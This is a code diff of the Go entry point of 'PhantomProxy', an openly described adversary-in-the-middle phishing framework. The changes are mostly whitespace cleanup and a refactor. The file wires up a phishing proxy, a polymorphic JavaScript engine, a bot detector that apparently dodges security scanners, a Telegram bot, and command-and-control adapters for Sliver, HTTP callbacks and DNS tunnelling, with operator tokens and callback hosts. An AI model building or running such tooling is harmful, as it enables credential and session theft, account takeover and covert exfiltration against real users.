@@ -7,7 +7,6 @@ import (
 	"os"
 	"os/signal"
 	"syscall"
-	"time"
 
 	"github.com/fatih/color"
 	"go.uber.org/zap"
@@ -28,12 +27,12 @@ import (
 const (
 	Version = "13.0.0"
 	Banner  = `
-██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗ 
-██╔══██╗██╔═══██╗██║     ██║     ██║████╗  ██║██╔════╝ 
+██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗
+██╔══██╗██╔═══██╗██║     ██║     ██║████╗  ██║██╔════╝
 ██████╔╝██║   ██║██║     ██║     ██║██╔██╗ ██║██║  ███╗
 ██╔═══╝ ██║   ██║██║     ██║     ██║██║╚██╗██║██║   ██║
 ██║     ╚██████╔╝███████╗███████╗██║██║ ╚████║╚██████╔╝
-╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝
 
 PhantomProxy v%s - AitM Framework Next Generation
 `
@@ -43,63 +42,63 @@ func main() {
 	configPath := flag.String("config", "config.yaml", "Путь к конфигурационному файлу")
 	debug := flag.Bool("debug", false, "Режим отладки")
 	version := flag.Bool("version", false, "Показать версию")
-	
+
 	flag.Parse()
-	
+
 	if *version {
 		fmt.Printf("PhantomProxy v%s\n", Version)
 		os.Exit(0)
 	}
-	
+
 	color.Cyan(Banner, Version)
-	
+
 	logger, err := initLogger(*debug)
 	if err != nil {
 		color.Red("[!] Failed to initialize logger: %v", err)
 		os.Exit(1)
 	}
 	defer logger.Sync()
-	
+
 	logger.Info("Starting PhantomProxy...", zap.String("version", Version))
-	
+
 	cfg, err := config.Load(*configPath)
 	if err != nil {
 		logger.Fatal("Failed to load config", zap.Error(err))
 	}
-	
+
 	if *debug {
 		cfg.Debug = true
 	}
-	
-	logger.Info("Config loaded", 
+
+	logger.Info("Config loaded",
 		zap.String("domain", cfg.Domain),
 		zap.Int("https_port", cfg.HTTPSPort),
 		zap.Bool("debug", cfg.Debug))
-	
+
 	db, err := database.NewDatabase(cfg.DatabasePath)
 	if err != nil {
 		logger.Fatal("Failed to initialize database", zap.Error(err))
 	}
 	defer db.Close()
-	
+
 	logger.Info("Database initialized", zap.String("path", cfg.DatabasePath))
-	
+
 	// Создание HTTP прокси
 	httpProxy, err := proxy.NewHTTPProxy(cfg, db, logger)
 	if err != nil {
 		logger.Fatal("Failed to create HTTP proxy", zap.Error(err))
 	}
-	
+
 	// Инициализация Polymorphic JS Engine
 	if cfg.PolymorphicEnabled {
 		polyEngine := polymorphic.NewEngine(cfg.PolymorphicLevel, 15)
 		logger.Info("Polymorphic JS Engine initialized",
 			zap.String("level", cfg.PolymorphicLevel))
-		
+
 		// Передаём движок в прокси
 		httpProxy.SetPolymorphicEngine(polyEngine)
 	}
-	
+
 	// Инициализация ML Bot Detector
 	if cfg.MLDetection {
 		botDetector := ml.NewBotDetector(logger, cfg.MLThreshold)
@@ -125,35 +124,36 @@ func main() {
 	// Контекст для graceful shutdown
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-	
+
 	// Обработка сигналов
 	sigChan := make(chan os.Signal, 2)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
-	
+
 	go func() {
 		<-sigChan
 		logger.Info("Shutdown signal received")
 		cancel()
 	}()
-	
+
 	// Запуск прокси
-	logger.Info("Starting HTTP/HTTPS proxy", 
+	logger.Info("Starting HTTP/HTTPS proxy",
 		zap.String("bind", cfg.BindIP),
 		zap.Int("port", cfg.HTTPSPort))
-	
+
 	go func() {
 		if err := httpProxy.Start(ctx); err != nil {
 			logger.Error("HTTP proxy error", zap.Error(err))
 		}
 	}()
-	
+
 	// Запуск API сервера
 	if cfg.APIEnabled {
 		apiServer := api.NewAPIServer(httpProxy, db, logger, cfg.APIKey)
-		
+		apiServer.SetEventBus(eventBus)
+
 		logger.Info("Starting API server",
 			zap.Int("port", cfg.APIPort))
-		
+
 		go func() {
 			addr := fmt.Sprintf("%s:%d", cfg.BindIP, cfg.APIPort)
 			if err := apiServer.Start(addr); err != nil {
@@ -161,7 +161,7 @@ func main() {
 			}
 		}()
 	}
-	
+
 	// Инициализация Telegram бота
 	if cfg.TelegramEnabled && cfg.TelegramToken != "" {
 		tgConfig := &telegram.Config{
@@ -178,30 +178,34 @@ func main() {
 			}
 		}
 	}
-	
+
 	// Ожидание завершения
 	<-ctx.Done()
-	
+
 	logger.Info("PhantomProxy stopped")
 	color.Green("\n[*] Shutdown complete")
 }
 
 func buildC2Manager(v13 *config.V13Config) *c2.Manager {
 	var adapters []c2.Adapter
-	if m, ok := v13.C2["sliver"].(map[string]interface{}); ok && m != nil {
-		if en, _ := m["enabled"].(bool); en {
+
+	// Sliver
+	if v13.C2.Sliver != nil {
+		if enabled, ok := v13.C2.Sliver["enabled"].(bool); ok && enabled {
 			adapters = append(adapters, c2.NewSliverAdapter(&c2.SliverConfig{
 				Enabled:       true,
-				ServerURL:     getStr(m, "server_url"),
-				OperatorToken: getStr(m, "operator_token"),
-				CallbackHost:  getStr(m, "callback_host"),
+				ServerURL:     getStr(v13.C2.Sliver, "server_url"),
+				OperatorToken: getStr(v13.C2.Sliver, "operator_token"),
+				CallbackHost:  getStr(v13.C2.Sliver, "callback_host"),
 			}))
 		}
 	}
-	if m, ok := v13.C2["http_callback"].(map[string]interface{}); ok && m != nil {
-		if en, _ := m["enabled"].(bool); en {
+
+	// HTTP Callback
+	if v13.C2.HTTPCallback != nil {
+		if enabled, ok := v13.C2.HTTPCallback["enabled"].(bool); ok && enabled {
 			var headers []string
-			if h, ok := m["headers"].([]interface{}); ok {
+			if h, ok := v13.C2.HTTPCallback["headers"].([]interface{}); ok {
 				for _, v := range h {
 					if s, ok := v.(string); ok {
 						headers = append(headers, s)
@@ -210,24 +214,27 @@ func buildC2Manager(v13 *config.V13Config) *c2.Manager {
 			}
 			adapters = append(adapters, c2.NewHTTPCallbackAdapter(&c2.HTTPCallbackConfig{
 				Enabled:     true,
-				CallbackURL: getStr(m, "callback_url"),
+				CallbackURL: getStr(v13.C2.HTTPCallback, "callback_url"),
 				Headers:     headers,
 			}))
 		}
 	}
-	if m, ok := v13.C2["dns_tunnel"].(map[string]interface{}); ok && m != nil {
-		if en, _ := m["enabled"].(bool); en {
+
+	// DNS Tunnel
+	if v13.C2.DNSTunnel != nil {
+		if enabled, ok := v13.C2.DNSTunnel["enabled"].(bool); ok && enabled {
 			chunk := 60
-			if c, ok := m["chunk_size"].(int); ok {
+			if c, ok := v13.C2.DNSTunnel["chunk_size"].(int); ok {
 				chunk = c
 			}
 			adapters = append(adapters, c2.NewDNSTunnelAdapter(&c2.DNSTunnelConfig{
-				Enabled: true,
-				Domain:  getStr(m, "domain"),
+				Enabled:   true,
+				Domain:    getStr(v13.C2.DNSTunnel, "domain"),
 				ChunkSize: chunk,
 			}))
 		}
 	}
+
 	return c2.NewManager(adapters...)
 }
 
@@ -240,12 +247,12 @@ func getStr(m map[string]interface{}, key string) string {
 
 func initLogger(debug bool) (*zap.Logger, error) {
 	cfg := zap.NewProductionConfig()
-	
+
 	if debug {
 		cfg.Level = zap.NewAtomicLevelAt(zap.DebugLevel)
 		cfg.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder
 		cfg.EncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
 	}
-	
+
 	return cfg.Build()
 }
